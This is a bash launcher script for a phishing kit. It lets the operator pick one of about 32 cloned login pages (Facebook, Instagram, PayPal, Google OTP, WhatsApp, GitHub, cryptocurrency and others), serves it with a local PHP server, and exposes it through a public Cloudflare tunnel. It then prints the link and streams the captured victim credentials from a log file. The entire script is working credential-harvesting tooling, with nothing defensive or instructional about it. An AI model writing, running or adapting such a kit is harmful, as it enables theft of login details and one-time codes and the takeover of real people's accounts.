#!/bin/bash
clear

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
cloudflared="$(ps -efw | grep cloudflared | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $cloudflared
clear
bash banner.sh
cat template.txt

listen() {
	 rm .link.log >> /dev/null 2>&1 
	 
	 if [[ `command -v termux-chroot` ]]; then
	 sleep 2 && termux-chroot cloudflared tunnel -url 127.0.0.1:4444 --logfile .link.log > /dev/null 2>&1 &
	 else
	 sleep 2 &&  ./cloudflared tunnel -url 127.0.0.1:4444 --logfile .link.log > /dev/null 2>&1 &
	 fi
	 sleep 15
	 echo "----------------------------------------------------------------"
	 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".link.log") 
	 echo "----------------------------------------------------------------"
	 echo -e "\n</> link:: $link"
	 echo "----------------------------------------------------------------"
	 echo "           </> :: INFORMATION VICTIM ACOUNT :: </>"
	 echo "----------------------------------------------------------------"
}
read -p '</> SELECT :: ' option
                 
if [ $option = 01 ] || [ $option = 1 ]
			   then 
                           cd sites/ 
                           cd tiktok/
                           echo ""
                           echo -e '           </> php server now staring </> '
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e '          </> cloudflare server starting </> '
                           cd ../..
                           listen
                           cd sites/ 
                           cd tiktok/
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           tail -f log.txt

                
	          break;
                  elif [ $option = 02 ] || [ $option = 2 ]
	          then
	                   cd sites/
                           cd facebook/         
                           echo ""
                           echo -e '           </> php server now staring </> '
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e '          </> cloudflare server starting </> '
                           cd ../..
                           listen
                           cd sites/ 
                           cd facebook/
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           tail -f log.txt


                  break;
                  elif [ $option = 03 ] || [ $option = 3 ]
	          then
                           cd sites/
                           cd instagram/
                           echo ""
                           echo -e '           </> php server now staring </> '
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e '          </> cloudflare server starting </> '
                           cd ../..
                           listen
                           cd sites/ 
                           cd instagram/
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           tail -f log.txt 
 
                  
                 break;
                 elif [ $option = 04 ] || [ $option = 4 ]
	         then
                           cd sites/
                           cd UberEats-Phishing/
                           echo ""
                           echo -e '           </> php server now staring </> '
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e '          </> cloudflare server starting </> '
                           cd ../..
                           listen
                           cd sites/ 
                           cd UberEats-Phishing/
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           tail -f log.txt 
                  
                  
                  
                break;
                elif [ $option = 05 ] || [ $option = 5 ]
	        then 
                           cd sites/
                           cd ola-otpbypass/
                           echo ""
                           echo -e '           </> php server now staring </> '
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e '          </> cloudflare server starting </> '
                           cd ../..
                           listen
                           cd sites/ 
                           cd ola-otpbypass/
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           tail -f log.txt 
                  
                 break;
                 elif [ $option = 06 ] || [ $option = 6 ]
	         then
                
                           cd sites/
                           cd google-otp/
                           echo ""
                           echo -e '           </> php server now staring </> '
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e '          </> cloudflare server starting </> '
                           cd ../..
                           listen
                           cd sites/ 
                           cd google-otp/
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           tail -f log.txt 
                  


                break;

                elif [ $option = 07 ] || [ $option = 7 ]
	        then
                          clear
                          cd sites/
                          cd Paym-Phishing/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd Paym-Phishing/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt
                 
                break;

				elif [ $option = 08 ] || [ $option = 8 ]
	        then

                          cd sites/
                          cd Netflix/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd Netflix/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt      

                break;
                
                elif [ $option = 09 ] || [ $option = 9 ]
	        then

                          cd sites/
                          cd instafollow/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd instafollow/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                 
                    

                break;
                elif [ $option = 10 ] || [ $option = 10 ]
	        then
                          cd sites/
                          cd amazonsign/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd amazonsign/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                  
      
                break;
                elif [ $option = 11 ] || [ $option = 11 ]
	        then
                          cd sites/
                          cd whatsapp-phishing/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd whatsapp-phishing/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt               
     

                break;
                elif [ $option = 12 ] || [ $option = 12 ]
	        then
                          cd sites/
                          cd Linkedin/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd Linkedin/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt  

                break;
                elif [ $option = 13 ] || [ $option = 13 ]
	        then
                          cd sites/
                          cd Hotstar-otp-bypass/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd Hotstar-otp-bypass/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                  
     

                break;
                elif [ $option = 14 ] || [ $option = 14 ]
	        then
                          cd sites/
                          cd spotify/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd spotify/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt  

                break;
                elif [ $option = 15 ] || [ $option = 15 ]
	        then
                          cd sites/
                          cd github/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd github/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                  

                break;
                elif [ $option = 16 ] || [ $option = 16 ]
	        then
                          cd sites/
                          cd ipfinder/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd ipfinder/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                 

                break;
                elif [ $option = 17 ] || [ $option = 17 ]
	        then
               
                          cd sites/
                          cd Zomato-Phishing/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd Zomato-Phishing/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                  
             

                break;
                elif [ $option = 18 ] || [ $option = 18 ]
	        then

                          cd sites/
                          cd phonepay/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd phonepay/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                  
                     

                break;
                elif [ $option = 19 ] || [ $option = 19 ]
	        then
                          cd sites/
                          cd paypal/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd paypal/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                  
     
                break;
                elif [ $option = 20 ] || [ $option = 20 ]
	        then
                          cd sites/
                          cd telegram/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd telegram/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt  

                break;
                elif [ $option = 21 ] || [ $option = 21 ]
	        then
                          cd sites/
                          cd twitter/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd twitter/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt  

                break;
                elif [ $option = 22 ] || [ $option = 22 ]
	        then
                          cd sites/
                          cd flipcart/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd flipcart/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                  
  

                break;
                elif [ $option = 23 ] || [ $option = 23 ]
	        then
                          cd sites/
                          cd wordpress/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd wordpress/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                 
    

                break;
                elif [ $option = 24 ] || [ $option = 24 ]
	        then
                          cd sites/
                          cd snapchat/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd snapchat/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                  
      

                break;
                elif [ $option = 25 ] || [ $option = 25 ]
	        then
                          cd sites/
                          cd protonmail/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd protonmail/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                  
 

                break;
                elif [ $option = 26 ] || [ $option = 26 ]
	        then
               
                          cd sites/
                          cd stackoverflow/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd stackoverflow/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                  
             

                break;
                elif [ $option = 27 ] || [ $option = 27 ]
	        then

                          cd sites/
                          cd ebay/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd ebay/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                 
                  

                break;
                elif [ $option = 28 ] || [ $option = 28 ]
	        then
                          cd sites/
                          cd twitch/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd twitch/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt                
     
                break;
                elif [ $option = 29 ] || [ $option = 29 ]
	        then
                          cd sites/
                          cd ajio/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd ajio/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt            
 

                break;
                elif [ $option = 30 ] || [ $option = 30 ]
	        then
                          cd sites/
                          cd cryptocurrency/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd cryptocurrency/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt              
 

                break;
                elif [ $option = 31 ] || [ $option = 31 ]
	        then
               
                          cd sites/
                          cd mobikwik/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd mobikwik/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt  

                break;
                elif [ $option = 32 ] || [ $option = 32 ]
	        then
                          cd sites/
                          cd pinterest/
                          echo ""
                          echo -e '           </> php server now staring </> '
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 3
                          echo ""
                          echo -e '          </> cloudflare server starting </> '
                          cd ../..
                          listen
                          cd sites/ 
                          cd pinterest/
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt        

                break;
   
               

                elif [ $option = 99 ]
	        then     
	                 echo
       	                 exit 
		break;
		      
                else 
		  
		         echo
		         echo -e "<!> Invalid option Try Again <!>"
		         sleep 2
                         exit
		         fi
                         done
